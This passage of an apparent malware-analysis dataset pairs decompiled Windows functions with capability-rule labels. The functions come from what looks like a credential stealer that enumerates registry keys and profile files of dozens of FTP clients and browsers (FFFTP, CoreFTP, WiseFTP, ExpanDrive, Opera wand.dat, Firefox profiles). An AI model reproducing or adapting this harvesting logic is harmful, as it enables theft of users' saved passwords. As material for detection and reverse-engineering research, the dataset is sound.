        "decompiled_code": "\nvoid __cdecl fcn.00405e92(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0xb, 0);\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\Sota\\\\FFFTP\", \"CredentialSalt\", &var_8h);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00403d12(arg_8h, iVar1, var_8h, 0xbeef0001);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\Sota\\\\FFFTP\", \"CredentialCheck\", &var_8h);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00403d12(arg_8h, iVar1, var_8h, 0xbeef0002);\n        fcn.0040178e(uVar2);\n    }\n    fcn.00405c93(arg_8h, \"Software\\\\Sota\\\\FFFTP\\\\Options\");\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 316
    },
    "00406113": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather direct-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406113(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0xc, 0);\n    fcn.00405f2b(arg_8h, \"Software\\\\CoffeeCup Software\\\\Internet\\\\Profiles\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 98
    },
    "004063a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather coreftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063a5(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0xd, 0);\n    fcn.00406144(arg_8h, \"Software\\\\FTPWare\\\\COREFTP\\\\Sites\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 96
    },
    "0040665c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ftp-explorer information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040665c(uint arg_8h)\n\n{\n    int32_t arg_ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0xe, 0);\n    fcn.00404097(arg_8h, \"\\\\FTP Explorer\", \"profiles.xml\", 0xbeef0000);\n    arg_ch = fcn.00401b82(*0x4120d5, \"Software\\\\FTP Explorer\\\\FTP Explorer\\\\Workspace\\\\MFCToolBar-224\", \"Buttons\", \n                          &var_8h);\n    if (arg_ch != 0) {\n        fcn.00401522(arg_8h, 0xbeef0001);\n        fcn.00401558(arg_8h, arg_ch, var_8h);\n        fcn.0040178e(arg_ch);\n    }\n    fcn.004063d6(arg_8h, \"Software\\\\FTP Explorer\\\\Profiles\");\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 249
    },
    "004066e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather frigate3 information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066e7(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0xf, 0);\n    fcn.00404097(arg_8h, \"\\\\Frigate3\", \"FtpSite.xml\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "00406722": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather securefx information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406722(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t lpString2;\n    uint arg_ch_00;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x10, 0);\n    str._VanDykeConfigSessions[0] = '\\\\';\n    fcn.00404097(arg_8h, \"_VanDyke\\\\Config\\\\Sessions\", \".ini\", 0xbeef0000);\n    lpString2 = fcn.00401b82(*0x4120d5, \"Software\\\\VanDyke\\\\SecureFX\", \"Config Path\", 0);\n    if (lpString2 != 0) {\n        arg_ch_00 = fcn.00401c5d(lpString2, \"\\\\Sessions\");\n        hMem = arg_8h;\n        fcn.0040404c(arg_8h, arg_ch_00, \".ini\", 0xbeef0000);\n        fcn.0040178e(hMem);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 260
    },
    "00406827": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ftprush information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406827(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x12, 0);\n    fcn.00404097(arg_8h, \"\\\\FTPRush\", \"RushSite.xml\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 103
    },
    "00406a2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a2a(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x13, 0);\n    fcn.00406862(arg_8h, \"Software\\\\Cryer\\\\WebSitePublisher\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 98
    },
    "00406a5b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather bitkinex information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a5b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x14, 0);\n    fcn.00404097(arg_8h, \"\\\\BitKinex\", \"bitkinex.ds\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "00406c8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406c8a(uint arg_8h, uint lpString)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = sub.kernel32.dll_lstrlenA(lpString);\n    var_4h = fcn.004017a5(var_8h);\n    iVar1 = fcn.004024bb(lpString, var_8h, var_4h);\n    if (iVar1 != 0) {\n        var_ch = iVar1;\n        iVar1 = fcn.004040d7(var_4h, &var_ch, 0);\n        if (iVar1 != 0) {\n            fcn.00401522(arg_8h, 0xbeef1000);\n            fcn.00401558(arg_8h, lpString, var_8h);\n            fcn.00401558(arg_8h, var_4h, var_ch);\n        }\n    }\n    fcn.0040178e(var_4h);\n    return;\n}\n",
        "token_count": 239
    },
    "00406dcd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather expandrive information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406dcd(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x15, 0);\n    fcn.00406a96(arg_8h, \"Software\\\\ExpanDrive\\\\Sessions\");\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\ExpanDrive\", \"ExpanDrive_Home\", 0);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00401c5d(iVar1, \"\\\\drives.js\");\n        uVar3 = arg_8h;\n        fcn.00406d02(arg_8h, uVar2);\n        fcn.0040178e(uVar3);\n    }\n    iVar1 = fcn.00401cc2(0x1a);\n    if (iVar1 != 0) {\n        uVar3 = fcn.00401c5d(iVar1, \"\\\\ExpanDrive\");\n        uVar2 = fcn.00401c5d(uVar3, \"\\\\drives.js\");\n        uVar3 = arg_8h;\n        fcn.00406d02(arg_8h, uVar2);\n        fcn.0040178e(uVar3);\n    }\n    iVar1 = fcn.00401cc2(0x1c);\n    if (iVar1 != 0) {\n        uVar3 = fcn.00401c5d(iVar1, \"\\\\ExpanDrive\");\n        uVar2 = fcn.00401c5d(uVar3, \"\\\\drives.js\");\n        uVar3 = arg_8h;\n        fcn.00406d02(arg_8h, uVar2);\n        fcn.0040178e(uVar3);\n    }\n    iVar1 = fcn.00401cc2(0x23);\n    if (iVar1 != 0) {\n        uVar3 = fcn.00401c5d(iVar1, \"\\\\ExpanDrive\");\n        uVar2 = fcn.00401c5d(uVar3, \"\\\\drives.js\");\n        uVar3 = arg_8h;\n        fcn.00406d02(arg_8h, uVar2);\n        fcn.0040178e(uVar3);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 559
    },
    "004070a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather classicftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004070a5(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x16, 0);\n    fcn.00406ec3(arg_8h, 0x80000002, \"Software\\\\NCH Software\\\\ClassicFTP\\\\FTPAccounts\");\n    fcn.00406ec3(arg_8h, *0x4120d5, \"Software\\\\NCH Software\\\\ClassicFTP\\\\FTPAccounts\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 141
    },
    "004072d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather fling-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004072d0(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x17, 0);\n    fcn.004070ee(arg_8h, *0x4120d5, \"SOFTWARE\\\\NCH Software\\\\Fling\\\\Accounts\");\n    fcn.004070ee(arg_8h, 0x80000002, \"SOFTWARE\\\\NCH Software\\\\Fling\\\\Accounts\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 137
    },
    "004073cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather softx-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004073cc(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x18, 0);\n    fcn.00407319(arg_8h, *0x4120d5, \"Software\\\\FTPClient\\\\Sites\");\n    fcn.00407319(arg_8h, 0x80000002, \"Software\\\\FTPClient\\\\Sites\");\n    fcn.00407319(arg_8h, *0x4120d5, \"Software\\\\SoftX.org\\\\FTPClient\\\\Sites\");\n    fcn.00407319(arg_8h, 0x80000002, \"Software\\\\SoftX.org\\\\FTPClient\\\\Sites\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 191
    },
    "0040749b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040749b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x19, 0);\n    fcn.0040743a(arg_8h, 0x1a);\n    fcn.0040743a(arg_8h, 0x23);\n    fcn.0040743a(arg_8h, 0x1c);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 130
    },
    "0040759a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather direct-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040759a(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x1a, 0);\n    fcn.004074dd(arg_8h, 0x1a, 0);\n    fcn.004074dd(arg_8h, 0x23, 0);\n    fcn.004074dd(arg_8h, 0x1c, 0);\n    fcn.004074dd(arg_8h, 0x1a, \"\\\\CoffeeCup Software\");\n    fcn.004074dd(arg_8h, 0x23, \"\\\\CoffeeCup Software\");\n    fcn.004074dd(arg_8h, 0x1c, \"\\\\CoffeeCup Software\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 208
    },
    "00407b63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407b63(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x1c, 0);\n    fcn.004078fd(arg_8h, *0x4120d5, \"Software\\\\Martin Prikryl\");\n    fcn.004078fd(arg_8h, 0x80000002, \"Software\\\\Martin Prikryl\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 132
    },
    "00407bac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407bac(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_ch;\n    uint hMem;\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x1d, 0);\n    uVar1 = sub.kernel32.dll_GetWindowsDirectoryA(&var_109h, 0x104);\n    if ((uVar1 != 0) && (uVar1 < 0x105)) {\n        arg_ch = fcn.00401c09(&var_109h, \"\\\\32BitFtp.ini\");\n        hMem = arg_8h;\n        fcn.00403d67(arg_8h, arg_ch, 0xbeef0000);\n        fcn.0040178e(hMem);\n    }\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 213
    },
    "00407c14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather netdrive information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c14(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x1e, 0);\n    fcn.00404097(arg_8h, \"\\\\NetDrive\", \"NDSites.ini\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "00407e67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather southriver-webdrive information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407e67(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x1f, 0);\n    fcn.00407c4f(arg_8h, *0x4120d5, \"Software\\\\South River Technologies\\\\WebDrive\\\\Connections\");\n    fcn.00407c4f(arg_8h, 0x80000002, \"Software\\\\South River Technologies\\\\WebDrive\\\\Connections\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 142
    },
    "00408169": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408169(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    fcn.004013a0(arg_8h, arg_ch);\n    iVar3 = arg_8h;\n    iVar1 = fcn.004014db(arg_8h);\n    if (iVar3 != 0) {\n        var_4h = fcn.00407f4a(arg_8h, arg_ch, &var_ch);\n        var_8h = fcn.00407f4a(arg_8h, arg_ch, &var_10h);\n        uVar2 = fcn.00407fd6(var_4h, var_ch, var_8h, var_10h);\n        fcn.0040178e(var_4h);\n        fcn.0040178e(var_8h);\n    }\n    fcn.00401051(arg_8h, iVar1 + iVar3, 0);\n    return uVar2;\n}\n",
        "token_count": 268
    },
    "0040865f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040865f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403e3a(arg_ch);\n    if (iVar1 == 0) {\n        fcn.00401000(&var_4h);\n        iVar1 = fcn.00401230(arg_ch, var_4h);\n        if (iVar1 != 0) {\n            fcn.0040841b(var_4h, arg_8h);\n        }\n        fcn.00401026(var_4h);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "00408986": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408986(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint in_stack_ffffff6c;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x21, 0);\n    fcn.00408964(arg_8h, 0x1a);\n    fcn.00408964(arg_8h, 0x23);\n    fcn.00408964(arg_8h, 0x1c);\n    iVar1 = fcn.00401b82(*0x4120d5, 0x4135bf, \"Last Directory3\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004086a4(arg_8h, iVar1, \"wand.dat\");\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, 0x4135bf, \"Last Install Path\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004086a4(arg_8h, iVar1, \"wand.dat\");\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(0x80000000, \"Opera.HTML\\\\shell\\\\open\\\\command\", 0, 0);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040223e(iVar1);\n        if (iVar1 != 0) {\n            in_stack_ffffff6c = arg_8h;\n            fcn.004086a4(arg_8h, iVar1, \"wand.dat\");\n            fcn.0040178e(in_stack_ffffff6c);\n        }\n        fcn.0040178e(in_stack_ffffff6c);\n    }\n    fcn.0040bcc2(arg_8h, \"\\\\Opera Software\", 0xbeef0002);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 484
    },
    "00408b62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key",
            "gather wise-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408b62(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch;\n    int32_t iVar3;\n    uint in_stack_fffff758;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(uVar2, &lpName);\n            fcn.0040178e(uVar2);\n            uVar2 = fcn.00401b82(hKey, arg_ch, 0, 0);\n            iVar1 = fcn.0040223e(uVar2);\n            if (iVar1 != 0) {\n                iVar3 = fcn.00401d90(iVar1);\n                if (iVar3 != 0) {\n                    fcn.0040404c(arg_8h, iVar1, \"wiseftpsrvs.ini\", 0xbeef0002);\n                    fcn.0040404c(arg_8h, iVar1, \"wiseftp.ini\", 0xbeef0002);\n                    in_stack_fffff758 = arg_8h;\n                    fcn.0040404c(arg_8h, iVar1, \"wiseftpsrvs.bin\", 0xbeef0000);\n                }\n                fcn.0040178e(in_stack_fffff758);\n            }\n            fcn.0040178e(uVar2);\n            fcn.00408b62(arg_8h, hKey, arg_ch);\n            fcn.0040178e(arg_ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "00408ca4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather wise-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ca4(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x22, 0);\n    fcn.00404097(arg_8h, \"\\\\AceBIT\", \"wiseftpsrvs.bin\", 0xbeef0000);\n    fcn.00408a73(arg_8h, *0x4120d5, \"Software\\\\AceBIT\");\n    fcn.00408a73(arg_8h, 0x80000002, \"Software\\\\AceBIT\");\n    fcn.00408b62(arg_8h, 0x80000002, \"SOFTWARE\\\\Classes\\\\TypeLib\\\\{CB1F2C0F-8094-4AAC-BCF5-41A64E27F777}\");\n    fcn.00408b62(arg_8h, 0x80000002, \"SOFTWARE\\\\Classes\\\\TypeLib\\\\{9EA55529-E122-4757-BC79-E4825F80732C}\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 262
    },
    "00408d9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408d9e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x23, 0);\n    fcn.00408d28(arg_8h, 0x1a);\n    fcn.00408d28(arg_8h, 0x23);\n    fcn.00408d28(arg_8h, 0x1c);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 131
    },
    "004097a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004097a9(uint arg_8h, uint hKey, uint lpSubKey, uint pszSrch, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t lpString2;\n    uint arg_ch;\n    uint uVar2;\n    int32_t in_stack_ffffffa4;\n    uint var_18h;\n    uint var_14h;\n    int32_t dwIndex;\n    uint var_ch;\n    uint lpName;\n    uint phkResult;\n    \n    iVar1 = sub.shlwapi.dll_StrStrIA(lpSubKey, pszSrch);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00401b82(hKey, lpSubKey, \"PathToExe\", 0);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0040223e(iVar1);\n            if (iVar1 != 0) {\n                lpString2 = fcn.00401cc2(0x1a);\n                if (lpString2 != 0) {\n                    arg_ch = fcn.00401c5d(lpString2, arg_18h);\n                    uVar2 = arg_8h;\n                    fcn.0040962e(arg_8h, arg_ch, iVar1);\n                    fcn.0040178e(uVar2);\n                }\n                fcn.0040178e(iVar1);\n                in_stack_ffffffa4 = iVar1;\n            }\n            fcn.0040178e(in_stack_ffffffa4);\n        }\n    }\n    lpName = fcn.004017a5(0x800);\n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            uVar2 = fcn.00401c5d(uVar2, lpName);\n            fcn.004097a9(arg_8h, hKey, uVar2, pszSrch, arg_18h);\n            fcn.0040178e(uVar2);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey();\n    }\n    fcn.0040178e(lpName);\n    return;\n}\n",
        "token_count": 591
    },
    "004098b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004098b1(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x24, 0);\n    *0x4137fb = 0;\n    sub.kernel32.dll_GetCurrentDirectoryA(0x104, &var_109h);\n    fcn.004097a9(arg_8h, *0x4120d5, \"Software\\\\Mozilla\", \"Firefox\", \"\\\\Mozilla\\\\Firefox\\\\\");\n    fcn.004097a9(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"Firefox\", \"\\\\Mozilla\\\\Firefox\\\\\");\n    sub.kernel32.dll_SetCurrentDirectoryA(&var_109h);\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 195
    },
    "00409938": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409938(uint arg_8h)\n\n{\n    int32_t lpString2;\n    uint arg_ch;\n    uint hMem;\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x25, 0);\n    lpString2 = fcn.00401cc2(0x1a);\n    if (lpString2 != 0) {\n        arg_ch = fcn.00401c5d(lpString2, \"\\\\Mozilla\\\\Firefox\\\\\");\n        hMem = arg_8h;\n        fcn.0040404c(arg_8h, arg_ch, \"fireFTPsites.dat\", 0xbeef1000);\n        fcn.0040178e(hMem);\n    }\n    *0x4137fb = 1;\n    sub.kernel32.dll_GetCurrentDirectoryA(0x104, &var_109h);\n    fcn.004097a9(arg_8h, *0x4120d5, \"Software\\\\Mozilla\", \"Firefox\", \"\\\\Mozilla\\\\Firefox\\\\\");\n    fcn.004097a9(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"Firefox\", \"\\\\Mozilla\\\\Firefox\\\\\");\n    sub.kernel32.dll_SetCurrentDirectoryA(&var_109h);\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 315
    },
    "004099ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004099ee(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x26, 0);\n    *0x4137fb = 0;\n    sub.kernel32.dll_GetCurrentDirectoryA(0x104, &var_109h);\n    fcn.004097a9(arg_8h, *0x4120d5, \"Software\\\\Mozilla\", \"SeaMonkey\", \"\\\\Mozilla\\\\SeaMonkey\\\\\");\n    fcn.004097a9(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"SeaMonkey\", \"\\\\Mozilla\\\\SeaMonkey\\\\\");\n    sub.kernel32.dll_SetCurrentDirectoryA(&var_109h);\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 198
    },
    "00409a75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409a75(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x27, 0);\n    *0x4137fb = 0;\n    sub.kernel32.dll_GetCurrentDirectoryA(0x104, &var_109h);\n    fcn.004097a9(arg_8h, *0x4120d5, \"Software\\\\Mozilla\", \"Flock\", \"\\\\Flock\\\\Browser\\\\\");\n    fcn.004097a9(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"Flock\", \"\\\\Flock\\\\Browser\\\\\");\n    sub.kernel32.dll_SetCurrentDirectoryA(&var_109h);\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 199
    },
    "00409afc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409afc(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x28, 0);\n    *0x4137fb = 0;\n    sub.kernel32.dll_GetCurrentDirectoryA(0x104, &var_109h);\n    fcn.004097a9(arg_8h, *0x4120d5, \"Software\\\\Mozilla\", \"Mozilla\", \"\\\\Mozilla\\\\Profiles\\\\\");\n    fcn.004097a9(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"Mozilla\", \"\\\\Mozilla\\\\Profiles\\\\\");\n    sub.kernel32.dll_SetCurrentDirectoryA(&var_109h);\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 194
    },
    "00409b83": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
